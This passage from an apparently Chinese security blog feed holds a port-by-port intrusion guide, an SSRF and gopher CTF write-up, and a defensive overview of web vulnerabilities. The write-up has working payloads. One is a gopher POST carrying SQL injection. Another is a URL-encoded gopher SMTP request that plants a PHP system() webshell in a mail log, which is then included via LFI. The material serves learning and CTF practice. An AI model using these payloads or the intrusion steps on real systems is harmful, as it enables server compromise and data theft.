SessionService’提供的</p><p>主要用于提供windows文件和打印机共享以及UNIX中的Samba服务</p><p>445端口也用于提供windows文件和打印机共享,在内网环境中使用的很广泛</p><p>这两个端口同样属于重点攻击对象，139&#x2F;445端口曾出现过许多严重级别的漏洞。</p></blockquote><p><strong>姿势</strong></p><ul><li>（1）对于开放139&#x2F;445端口的主机，一般尝试利用溢出漏洞对远程主机进行溢出攻击，成功后直接获得系统权限。</li><li>（2）对于攻击只开放445端口的主机，黑客一般使用工具‘MS06040’或‘MS08067’.可使用专用的445端口扫描器进行扫描。NS08067溢出工具对windows2003系统的溢出十分有效，工具基本使用参数在cmd下会有提示。</li><li>（3）对于开放139&#x2F;445端口的主机，黑客一般使用IPC$进行渗透。在没有使用特点的账户和密码进行空连接时，权限是最小的。获得系统特定账户和密码成为提升权限的关键了，比如获得administrator账户的口令。</li><li>（4）对于开放139&#x2F;445端口的主机，可利用共享获取敏感信息，这也是内网渗透中收集信息的基本途径。</li></ul><h3 id="2-7-1433端口入侵"><a href="#2-7-1433端口入侵" class="headerlink" title="2.7 1433端口入侵"></a>2.7 1433端口入侵</h3><p><strong>简介</strong></p><blockquote><p>1433是SQLServer默认的端口</p><p>SQL Server服务使用两个端口：tcp-1433、UDP-1434</p><p>1433用于供SQLServer对外提供服务</p><p>1434用于向请求者返回SQLServer使用了哪些TCP&#x2F;IP端口</p><p>1433端口通常遭到黑客的攻击，而且攻击的方式层出不穷。</p><p>最严重的莫过于远程溢出漏洞了,如:</p><p>由于SQL注射攻击的兴起，各类数据库时刻面临着安全威胁。</p><p>利用SQL注射技术对数据库进行渗透是目前比较流行的攻击方式，此类技术属于脚本渗透技术。</p></blockquote><p><strong>姿势</strong></p><ul><li>（1）对于开放1433端口的SQL Server2000的数据库服务器，黑客尝试使用远程溢出漏洞对主机进行溢出测试，成功后直接获得系统权限。</li><li>（2）暴力破解技术是一项经典的技术。一般破解的对象都是SA用户。通过字典破解的方式很快破解出SA的密码。</li><li>（3）嗅探技术同样能嗅探到SQL Server的登录密码。</li><li>（4）由于脚本程序编写的不严密，例如，程序员对参数过滤不严等，这都会造成严重的注射漏洞。通过SQL注射可间接性的对数据库服务器进行渗透，通过调用一些存储过程执行系统命令。可以使用SQL综合利用工具完成。</li></ul><h3 id="2-8-1521端口入侵"><a href="#2-8-1521端口入侵" class="headerlink" title="2.8 1521端口入侵"></a>2.8 1521端口入侵</h3><p><strong>简介</strong></p><blockquote><p>大型数据库Oracle的默认监听端口</p></blockquote><p><strong>姿势</strong></p><ul><li>（1）Oracle拥有非常多的默认用户名和密码，为了获得数据库系统的访问权限，破解数据库系统用户以及密码是黑客必须攻破的一道安全防线。</li><li>（2）SQL注射同样对Oracle十分有效，通过注射可获得数据库的敏感信息，包括管理员密码等。</li><li>（3）在注入点直接创建java，执行系统命令。</li></ul><h3 id="2-9-3306端口入侵"><a href="#2-9-3306端口入侵" class="headerlink" title="2.9 3306端口入侵"></a>2.9 3306端口入侵</h3><p><strong>简介</strong></p><blockquote><p>3306是MYSQL数据库默认的监听端口</p><p>通常部署在中型web系统中</p><p>在国内LAMP的配置是非常流行的</p><p>对于php+mysql构架的攻击也是属于比较热门的话题</p><p>mysql数据库允许用户使用自定义函数功能</p><p>这使得黑客可编写恶意的自定义函数对服务器进行渗透</p><p>最后取得服务器最高权限</p></blockquote><p><strong>姿势</strong></p><ul><li>（1）由于管理者安全意识淡薄，通常管理密码设置过于简单，甚至为空口令。使用破解软件很容易破解此类密码，利用破解的密码登录远程mysql数据库，上传构造的恶意UDF自定义函数代码进行注册，通过调用注册的恶意函数执行系统命令。或者向web目录导出恶意的脚本程序，以控制整个web系统。</li><li>（2）功能强大的‘cain’同样支持对3306端口的嗅探，同时嗅探也是渗透思路的一种。</li><li>（3）SQL注入同样对mysql数据库威胁巨大，不仅可以获取数据库的敏感信息，还可使用load_file()函数读取系统的敏感配置文件或者从web数据库链接文件中获得root口令等，导出恶意代码到指定路径等。</li></ul><h3 id="2-10-3389端口入侵"><a href="#2-10-3389端口入侵" class="headerlink" title="2.10 3389端口入侵"></a>2.10 3389端口入侵</h3><p><strong>简介</strong></p><blockquote><p>3389是windows远程桌面服务默认监听的端口</p><p>管理员通过远程桌面对服务器进行维护</p><p>通常利用它可对远程服务器进行控制，而且不需要另外安装额外的软件，</p><p>当然这也是系统合法的服务，通常是不会被杀毒软件所查杀的。</p><p>使用‘输入法漏洞’进行渗透。</p></blockquote><p><strong>姿势</strong></p><ul><li>（1）对于windows2000的旧系统版本，使用‘输入法漏洞’进行渗透。</li><li>（2）针对windows2000终端服务的一个密码破解程序，这个程序被微软公司推荐给用户使用，来检查终端服务密码的强壮性。程序使用msrdp空间，可在本地虚拟远程终端连接窗口，通过密码字典进行破解。可以指定多种参数，使用比较灵活，破解速度视攻击主机与被攻击主机网络带宽来定。稍等下，虚拟机有点卡。我们先看第三种方法吧。</li><li>（3）cain是一款超级的渗透工具，同样支持对3389端口的嗅探。</li><li>（4）映像劫持与shift粘贴键的配合使用。通常安全人员配置服务器安全时，都会考虑使用功能强大的组策略。比如阻止非法攻击者执行cmd命令和拒绝非授权远程登录用户等（关于组策略的详细设置方法我们已经在信息系统安全工程师课程做了详细的讲解），即使你拥有管理员权限同样不能进行登录。黑客突破组策略的秘籍就在3389登录框这里，也就是映像劫持与shift粘贴键的配合使用，调出任务管理器然后在任务管理器中打开组策略编辑器，这里可根据实际情侣进行修改了。</li><li>（5）社会工程学通常是最可怕的攻击技术，如果管理者的一切习惯和规律被黑客摸透的话，那么他管理的网络系统会因为他的弱点被渗透。</li></ul><h3 id="2-11-4899端口入侵"><a href="#2-11-4899端口入侵" class="headerlink" title="2.11 4899端口入侵"></a>2.11 4899端口入侵</h3><p><strong>简介</strong></p><blockquote><p>4899端口是remoteadministrator远程控制软件默认监听的端口</p><p>也就是平时常说的radmini影子</p><p>radmini目前支持TCP&#x2F;IP协议</p><p>应用十分广泛</p><p>在很多服务器上都会看到该款软件的影子。</p></blockquote><p><strong>姿势</strong></p><ul><li>（1）radmini同样存在不少弱口令的主机，通过专用扫描器可探测到此类存在漏洞的主机。</li><li>（2）radmini远控的连接密码和端口都是写入到注册表系统中的，通过使用webshell注册表读取功能可读取radmini在注册表的各项键值内容，从而破解加密的密码散列。</li></ul><h3 id="2-12-5631端口入侵"><a href="#2-12-5631端口入侵" class="headerlink" title="2.12 5631端口入侵"></a>2.12 5631端口入侵</h3><p><strong>简介</strong></p><blockquote><p>5631端口是著名远程控制软件symantecpcanywhere的默认监听端口</p><p>同时也是世界领先的远程控制软件</p><p>利用此软件，用户可以有效管理计算机并快速解决技术支持问题。</p><p>由于软件的设计缺陷，使得黑客可:</p><p>随意下载保存连接密码的*.cif文件</p><p>通过专用破解软件进行破解</p><p>这些操作都必须在拥有一定权限下才可完成</p><p>至少通过脚本渗透获得一个webshell。</p><p>通常这些操作在黑客界被称为pcanywhere提权技术。</p></blockquote><h3 id="2-13-5900端口入侵"><a href="#2-13-5900端口入侵" class="headerlink" title="2.13 5900端口入侵"></a>2.13 5900端口入侵</h3><p><strong>简介</strong></p><blockquote><p>5900端口是优秀远程控制软件VNC的默认监听端口</p><p>VNC是在基于unix和linux操作系统的免费的开放源码软件</p><p>远程控制能力强大，高效实用</p><p>其性能可以和windows和MAC中的任何一款控制软件媲美。</p></blockquote><p><strong>姿势</strong></p><ul><li>（1）VNC软件存在密码验证绕过漏洞，此高危漏洞可以使得恶意攻击者不需要密码就可以登录到一个远程系统。</li><li>（2）cain同样支持对VNC的嗅探，同时支持端口修改。</li><li>（3）VNC的配置信息同样被写入注册表系统中，其中包括连接的密码和端口。利用webshell的注册表读取功能进行读取加密算法，然后破解。</li></ul><h3 id="2-14-8080端口入侵"><a href="#2-14-8080端口入侵" class="headerlink" title="2.14 8080端口入侵"></a>2.14 8080端口入侵</h3><p><strong>简介</strong></p><blockquote><p>8080端口通常是apache_Tomcat服务器默认监听端口</p><p>apache是世界使用排名第一的web服务器</p><p>国内很多大型系统都是使用apache服务器</p></blockquote><p><strong>姿势</strong></p><ul><li>（1）apache tomcatUTF-8目录遍历漏洞，tomcat处理请求中的编码时存在漏洞，如果在context.xml或server.xml中将allowlinking设置为true，且连接器配置为URIEncoding&#x3D;UTF-8，若黑客向apache提交恶意请求就可以通过目录遍历攻击读取服务器上的任意文件，包括&#x2F;etc&#x2F;passwd等</li><li>（2）apache后台弱口令漏洞，黑客可使用专用扫描器探测此类漏洞。</li><li>（3）JSP爆源码漏洞，对于一些旧版本的tomcat，黑客通过提交一些注入.jsP.Jsp等，尝试找源码代码和目录文件。查找上传文件，直接上传他们的JSP脚本后门。</li><li>（4）apache在windows环境下是以系统权限启动的，JSP的脚本同样继承了该权限，可直接执行任意系统命令。</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Vulnerabilities </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Red Team Operations Manual</title>
      <link href="/2020/06/14/Red-Team-Operations-Manual/"/>
      <url>/2020/06/14/Red-Team-Operations-Manual/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="ede165b3443fda24dc7a87042e6d25c703b15635dbca0221a47a11e80e8bea03"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> Notes </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSRF and the Gopher Protocol</title>
      <link href="/2020/06/04/SSRF-and-Gopher-Protocol/"/>
      <url>/2020/06/04/SSRF-and-Gopher-Protocol/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-SSRF"><a href="#0x01-SSRF" class="headerlink" title="0x01 SSRF"></a>0x01 SSRF</h2><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF是要目标网站的内部系统。（因为他是从内部系统访问的，所有可以通过它攻击外网无法访问的内部系统，也就是把目标网站当中间人）</p><h3 id="形成"><a href="#形成" class="headerlink" title="形成"></a>形成</h3><p>SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能，且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，文档，等等。</p><h3 id="模型"><a href="#模型" class="headerlink" title="模型"></a>模型</h3><p>首先，我们要对目标网站的架构了解，脑子了要有一个架构图。比如 ： A网站，是一个所有人都可以访问的外网网站，B网站是一个他们内部的OA网站。</p><p>所以，我们普通用户只可以访问a网站，不能访问b网站。但是我们可以同过a网站做中间人，访问b网站，从而达到攻击b网站需求。</p><p><strong>正常用户访问网站的流程是：</strong></p><p>输入A网站URL –&gt; 发送请求 –&gt; A服务器接受请求（没有过滤），并处理 –&gt;返回用户响应</p><p>【那网站有个请求是<a href="http://www.google.com/xxx.php?image=URL">www.google.com/xxx.php?image=URL</a>】</p><p>产生SSRF漏洞的环节在安全的网站应接收请求后，检测请求的合法性</p><h3 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h3><p>产生的原因：服务器端的验证并没有对其请求获取图片的参数（image&#x3D;）做出严格的过滤以及限制，导致A网站可以从其他服务器的获取数据</p><p>例如：</p><p><a href="http://www.google.com/xxx.php?image=www.abc.com/1.jpg">www.google.com/xxx.php?image=www.abc.com/1.jpg</a></p><p>我们将<a href="http://www.abd.com/1.jpg">www.abd.com/1.jpg</a>换为与该服务器相连的内网服务器地址</p><p>如果存在该内网地址就会返回1xx 2xx 之类的状态码，不存在就会其他的状态码</p><h3 id="总述"><a href="#总述" class="headerlink" title="总述"></a>总述</h3><p> SSRF漏洞就是通过篡改获取资源的请求发送给服务器，但是服务器并没有检测这个请求是否合法的，然后服务器以他的身份来访问其他服务器的资源。</p><h3 id="用途"><a href="#用途" class="headerlink" title="用途"></a>用途</h3><p><strong>1.内外网的端口和服务扫描</strong></p><p><strong>2.主机本地敏感数据的读取</strong></p><p><strong>3.内外网主机应用程序漏洞的利用</strong></p><p><strong>4.内外网Web站点漏洞的利用</strong></p><h3 id="位置"><a href="#位置" class="headerlink" title="位置"></a>位置</h3><ul><li><p>1）分享：通过URL地址分享网页内容</p></li><li><p>2）转码服务</p></li><li><p>3）在线翻译</p></li><li><p>4）图片加载与下载：通过URL地址加载或下载图片</p></li><li><p>5）图片、文章收藏功能</p></li><li><p>6）未公开的api实现以及其他调用URL的功能</p></li><li><p>7）从URL关键字中寻找</p></li><li><blockquote><p>share<br>wap<br>url<br>link<br>src<br>source<br>target<br>u<br>3g<br>display<br>sourceURl<br>imageURL<br>domain</p></blockquote></li></ul><h3 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h3><p>1）因为SSRF漏洞是让服务器发送请求的安全漏洞，所以我们就可以通过抓包分析发送的请求是否是由服务器的发送的，从而来判断是否存在SSRF漏洞</p><p>2）在页面源码中查找访问的资源地址 ，如果该资源地址类型为<code> www.google.com/xxx.php?image=</code>（地址）的就可能存在SSRF漏洞</p><p>3）sftp gopher ftp dict tftp ldap file</p><h2 id="0x02-gopher协议"><a href="#0x02-gopher协议" class="headerlink" title="0x02 gopher协议"></a>0x02 gopher协议</h2><p><strong>gopher协议没有默认端口，所以需要指定web端口，而且需要指定post方法。回车换行使用%0d%a。注意post参数之间的&amp;分隔符也要进行url编码</strong><br>这是一个具体的gopher协议的例子（swpuctf web300）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">gopher://172.16.181.166:80/_POST /admin/wllmctf_login.php HTTP/1.1%0d%0a</span><br><span class="line">Host: 172.16.191.166%0d%0a</span><br><span class="line">User-Agent: curl/7.43.0%0d%0a</span><br><span class="line">Accept: */*%0d%0a</span><br><span class="line">Content-Length: 29%0d%0a</span><br><span class="line">Content-Type: application/x-www-form-urlencoded%0d%0a%0d%0a</span><br><span class="line">user=admin&#x27; or &#x27;1&#x27;=&#x27;1%26password=admin</span><br></pre></td></tr></table></figure><p>注意：如果ssrf的点是get参数，因为处于url中，则需要进行一次url编码，上述例子将会编码成：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher%3A%2f%2f172.16.181.166%3A80%2f_POST%20%2fadmin%2</span><br></pre></td></tr></table></figure><h2 id="0x03-一道利用ssrf，gopher打内网的例题"><a href="#0x03-一道利用ssrf，gopher打内网的例题" class="headerlink" title="0x03 一道利用ssrf，gopher打内网的例题"></a>0x03 一道利用ssrf，gopher打内网的例题</h2><blockquote><p><a href="(https://www.jianshu.com/p/804d95f6d6fb)">引用</a></p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$x</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;x&#x27;</span>];</span><br><span class="line"><span class="variable">$pos</span> = <span class="title function_ invoke__">strpos</span>(<span class="variable">$x</span>,<span class="string">&quot;php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$pos</span>)&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&quot;denied&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>,CURLOPT_URL,<span class="string">&quot;<span class="subst">$x</span>&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>,CURLOPT_RETURNTRANSFER,<span class="literal">true</span>);</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$result</span>;</span><br></pre></td></tr></table></figure><ul><li>首先x我们可以控制</li><li>x可利用的协议有gopher、dict、http、https、file等</li><li><code>file协议</code>可以用于查看文件</li><li><code>dict协议</code>可以用于刺探端口</li><li><code>gopher协议</code>支持GET&amp;POST请求，常用于攻击内网ftp、redis、telnet、smtp等服务，还可以利用gopher协议访问redis反弹shell</li></ul><h3 id="Tip1"><a href="#Tip1" class="headerlink" title="Tip1"></a><strong>Tip1</strong></h3><p>脚本扫描目录，得到<code>flag.php</code>。<br>一般我们还可以读取<code>/etc/hosts</code>，<code>/etc/passwd</code>，<code>~/.bash_history</code>等文件查看线索</p><p>但是代码中有strops的限制,所以需要利用**%2570绕过**</p><p>%2570代表p,故url的末尾是flag.ph%2570</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/11525934-bb3f036fecb55b92.jpg" alt="img"></p><h3 id="Tip2"><a href="#Tip2" class="headerlink" title="Tip2"></a><strong>Tip2</strong></h3><p>最后我们读取<code>/var/www/html/flag.php</code>时发现线索</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/11525934-e9edd37554c44f23.jpg" alt="img"></p><h3 id="Tip3"><a href="#Tip3" class="headerlink" title="Tip3"></a><strong>Tip3</strong></h3><p>继续读取<code>/etc/hosts</code>得到一个内网地址</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/11525934-7e173ced6a87b2d7.jpg" alt="img"></p><h3 id="Tip4"><a href="#Tip4" class="headerlink" title="Tip4"></a><strong>Tip4</strong></h3><p>得到内网段，则需要利用服务器去打外网访问不到的内网其他主机。</p><p>这里知道了内网IP的格式，于是就可以利用<code>curl</code>的<code>http</code>协议，刺探内网其他主机<code>172.18.0.*</code></p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/11525934-79889f85a6259b58.jpg" alt="img"></p><h3 id="Tip5"><a href="#Tip5" class="headerlink" title="Tip5"></a><strong>Tip5</strong></h3><p>我们可以继续扫描，发现只有<code>172.18.0.1|2|3</code>可以访问。<br><code>http://101.71.29.5:10012/?x=http://172.18.0.2</code>的返回结果如下图，存在<code>LFI</code>漏洞</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/11525934-702e57e122f18f6e.jpg" alt="img"></p><h3 id="Tip6"><a href="#Tip6" class="headerlink" title="Tip6"></a><strong>Tip6</strong></h3><p>扫码端口开放情况,可以看到,25端口，即smtp服务</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/11525934-7ddbc9552cf39882.jpg" alt="img"></p><h3 id="Tip7"><a href="#Tip7" class="headerlink" title="Tip7"></a><strong>Tip7</strong></h3><p>于是可以联想到利用<code>gopher</code>协议打smtp，然后再结合之前发现的LFI漏洞，得出这样的思路</p><blockquote><p>利用gopher打smtp，在日志文件中留下一句话木马，然后用LFI包含日志文件获取webshell</p></blockquote><p>具体执行：</p><p>先用<a href="https://links.jianshu.com/go?to=https://github.com/tarunkant/Gopherus">gopherus</a>脚本生成payload，gopherus地址里面有详细用法。</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/11525934-05ea1434ba0fa8b8.jpg" alt="img"></p><h3 id="Tip8"><a href="#Tip8" class="headerlink" title="Tip8"></a><strong>Tip8</strong></h3><p>把生成的payload复制下来，然后改下IP，改成172.18.0.2<br> <code>gopher://172.18.0.2:25/_MAIL%20FROM:%3Cmiracle%40778.com%3E%0ARCPT%20To:%3C%3F%20system%28%24_GET%5B%27miracle%27%5D%29%3B%20%3F%3E%0ADATA%0AFrom:%3Cmiracle%40778.com%3E%0ASubject:test%0AMessage:test%0A.</code><br> 然后进行url编码,得到最终payload:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%67%6f%70%68%65%72%3a%2f%2f%31%37%32%2e%31%38%2e%30%2e%32%3a%32%35%2f%5f%4d%41%49%4c%25%32%30%46%52%4f%4d%3a%25%33%43%6d%69%72%61%63%6c%65%25%34%30%37%37%38%2e%63%6f%6d%25%33%45%25%30%41%52%43%50%54%25%32%30%54%6f%3a%25%33%43%25%33%46%25%32%30%73%79%73%74%65%6d%25%32%38%25%32%34%5f%47%45%54%25%35%42%25%32%37%6d%69%72%61%63%6c%65%25%32%37%25%35%44%25%32%39%25%33%42%25%32%30%25%33%46%25%33%45%25%30%41%44%41%54%41%25%30%41%46%72%6f%6d%3a%25%33%43%6d%69%72%61%63%6c%65%25%34%30%37%37%38%2e%63%6f%6d%25%33%45%25%30%41%53%75%62%6a%65%63%74%3a%74%65%73%74%25%30%41%4d%65%73%73%61%67%65%3a%74%65%73%74%25%30%41%2e</span><br></pre></td></tr></table></figure><h3 id="Tip9"><a href="#Tip9" class="headerlink" title="Tip9"></a><strong>Tip9</strong></h3><p>然后我们利用包含smtp的日志文件,</p><p>利用这个payload，污染日志文件，</p><p>payload利用gopher协议尝试用smtp发送邮件，当然因为我们的地址填的是一句话木马，所以这里肯定发送失败，不过却会在日志文件中留下记录。</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/11525934-738aed77ce42215c.jpg" alt="img"></p><h3 id="Tip10"><a href="#Tip10" class="headerlink" title="Tip10"></a><strong>Tip10</strong></h3><p>一般来讲linux中的邮件日志文件路径为</p><ul><li>&#x2F;var&#x2F;log&#x2F;maillog</li><li>&#x2F;var&#x2F;log&#x2F;mail.log</li><li>&#x2F;var&#x2F;adm&#x2F;maillog</li><li>&#x2F;var&#x2F;adm&#x2F;syslog&#x2F;mail.log</li></ul><p>这里可以利用前面的LFI，利用<code>php://filter</code>协议，查看上面四个日志文件路径，看看哪个有输出。最后发现，日志文件路径是<code>/var/log/mail.log</code></p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/11525934-30387427f6414e4e.jpg" alt="img"></p><h3 id="Tip11"><a href="#Tip11" class="headerlink" title="Tip11"></a><strong>Tip11</strong></h3><p>解密,蚁?连接一句话，查看flag</p><h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>1、<a href="https://bugs.php.net这是一个包含php漏洞的网址/">https://bugs.php.net这是一个包含php漏洞的网址</a></p><blockquote><p>例如我们可以利用谷歌语法搜索<br>site: <a href="https://bugs.php.net/">https://bugs.php.net</a> strpos</p></blockquote><p>2、ssrf一般先探测主机，然后探测端口，找到对应服务，再利用相应的payload</p>]]></content>
      
      
      
        <tags>
            
            <tag> Vulnerabilities </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Common Web Application Vulnerabilities: Principles, Risks, and Defenses</title>
      <link href="/2020/06/02/Common-Web-Application-Vulnerabilities/"/>
      <url>/2020/06/02/Common-Web-Application-Vulnerabilities/</url>
      
        <content type="html"><![CDATA[<h2 id="SQL注入-SQL-Inject-OWASP-TOP1-2017"><a href="#SQL注入-SQL-Inject-OWASP-TOP1-2017" class="headerlink" title="SQL注入[SQL Inject](OWASP TOP1 2017)"></a>SQL注入[SQL Inject](OWASP TOP1 2017)</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>SQL注入就是把SQL命令插入到Web表单然后提交到所在页面请求（查询字符串），从而达到欺骗服务器执行恶意的SQL命令。<br>它是利用现在已有的应用程序，将SQL语句插入到数据库中执行，执行一些并非按照设计者意图的SQL语句。</p><h3 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h3><p>根据相关技术原理，SQL注入可以分为平台层注入和代码层注入。平台层注入：</p><ul><li>由不安全的数据库配置或数据库平台的漏洞所致</li></ul><p>代码层注入：</p><ul><li>主要是由于程序员对输入未进行细致地过滤，从而执行了非法的数据查询。</li></ul><p>基于此，SQL注入的产生原因通常表现在以下几方面：</p><p>①不当的类型处理；</p><p>②不安全的数据库配置；</p><p>③不合理的查询集处理；</p><p>④不当的错误处理；</p><p>⑤转义字符处理不合适；</p><p>⑥多个提交处理不当。</p><h3 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h3><ul><li>数据库信息泄漏：数据库中存放的用户的隐私信息的泄露。</li><li>网页篡改：通过操作数据库对特定网页进行篡改。</li><li>网站被挂马，传播恶意软件：修改数据库一些字段的值，嵌入网马链接，进行挂马攻击。</li><li>数据库被恶意操作：数据库服务器被攻击，数据库的系统管理员帐户被窜改。</li><li>服务器被远程控制，被安装后门。经由数据库服务器提供的操作系统支持，让黑客得以修改或控制操作系统。</li><li>破坏硬盘数据，瘫痪全系统。</li></ul><h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><p>(1)严格的数据类型<br>(2)字符转义<br>(3)使用预编译语句<br>(4)存储过程</p><h2 id="XSS-Cross-site-Script-OWASP-TOP7-2017"><a href="#XSS-Cross-site-Script-OWASP-TOP7-2017" class="headerlink" title="XSS[Cross-site Script](OWASP TOP7 2017)"></a>XSS[Cross-site Script](OWASP TOP7 2017)</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>攻击者往Web页面里插入恶意html标签或者javascript代码。<br>分别是反射型XSS、持久型XSS和DOM XSS</p><h3 id="危害-1"><a href="#危害-1" class="headerlink" title="危害"></a>危害</h3><p>（1）网络钓鱼，盗取各类用户的账号<br>（2）窃取用户Cookie，获取用户隐私，或者利用用户身份进一步执行操作<br>（3）劫持用户（浏览器）会话，从而执行任意操作，例如进行非法转账、强制发表日志等<br>（4）强制弹出广告页面，刷流量等<br>（5）进行恶意操作，例如任意篡改页面信息，删除文章等，传播跨站脚本蠕虫，网页挂等<br>（6）进行基于大量的客户端攻击，如DDOS攻击<br>（7）结合其它漏洞，如CSRF漏洞。</p><h3 id="防御-1"><a href="#防御-1" class="headerlink" title="防御"></a>防御</h3><p>1）代码里对用户输入的地方和变量都需要仔细检查长度和对”&lt;”,”&gt;”,”;”,”’”等字符做过滤；其次任何内容写到页面之前都必须加以encode，避免不小心把html tag 弄出来。这一个层面做好，至少可以堵住超过一半的XSS 攻击。<br>（2）避免直接在cookie 中泄露用户隐私，例如email、密码等等。<br>（3）通过使cookie 和系统ip 绑定来降低cookie 泄露后的危险。这样攻击者得到的cookie 没有实际价值，不可能拿来重放。<br>（4）尽量采用POST 而非GET 提交表单</p><h2 id="上传漏洞"><a href="#上传漏洞" class="headerlink" title="上传漏洞"></a>上传漏洞</h2><h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><p>文件上传漏洞是指网络攻击者上传了一个可执行的文件到服务器，服务器未经任何检验或过滤，从而造成文件的执行。这里上传的文件可以是木马，病毒，恶意脚本或者WebShell等。</p><h3 id="危害-2"><a href="#危害-2" class="headerlink" title="危害"></a>危害</h3><p>1)上传文件是Web脚本语言，服务器的Web容器解释并执行了用户上传的脚本，导致代码执行。<br>2)上传文件是Flash的策略文件crossdomain.xml，黑客用以控制Flash在该域下的行为（其他通过类似方式控制策略文件的情况类似);<br>3)上传文件是病毒、木马文件，黑客用以诱骗用户或者管理员下载执行。<br>4)上传文件是钓鱼图片或为包含了脚本的图片，在某些版本的浏览器中会被作为脚本执行，被用于钓鱼和欺诈。</p><h3 id="防御-2"><a href="#防御-2" class="headerlink" title="防御"></a>防御</h3><p>（1）文件扩展名服务端白名单校验。<br>（2）文件内容服务端校验。<br>（3）上传文件重命名。<br>（4）隐藏上传文件路径。<br>（5）文件上传的目录设置为不可执行<br>（6）单独设置文件服务器的域名<br>以上几点，可以防御绝大多数上传漏洞，但是需要跟服务器容器结合起来。如果解析漏洞依然存在，那么没有绝对的安全。</p><h2 id="文件解析漏洞"><a href="#文件解析漏洞" class="headerlink" title="文件解析漏洞"></a>文件解析漏洞</h2><h3 id="1-IIS-6-0解析利用方法有两种"><a href="#1-IIS-6-0解析利用方法有两种" class="headerlink" title="1.IIS 6.0解析利用方法有两种"></a>1.IIS 6.0解析利用方法有两种</h3><ul><li>（1）目录解析：&#x2F;xx.asp&#x2F;xx.jpg</li><li>（2）文件解析：wooyun.asp;.jpg</li><li>第一种，在网站下建立文件夹的名字为 .asp、.asa 的文件夹，其目录内的任何扩展名的文件都被IIS当作asp文件来解析并执行。</li><li>第二种，在IIS6.0下，分号后面的不被解析，也就是说wooyun.asp;.jpg会被服务器看成是wooyun.asp<br>还有IIS6.0 默认的可执行文件除了asp还包含这三种.asa、.cer、.cdx</li></ul><h3 id="2-Apache解析漏洞后缀名解析漏洞"><a href="#2-Apache解析漏洞后缀名解析漏洞" class="headerlink" title="2.Apache解析漏洞后缀名解析漏洞"></a>2.Apache解析漏洞后缀名解析漏洞</h3><p>Apache 是从右到左开始判断解析,如果为不可识别解析,就再往左判断直到识别。</p><h3 id="3-PHP-CGI解析漏洞"><a href="#3-PHP-CGI解析漏洞" class="headerlink" 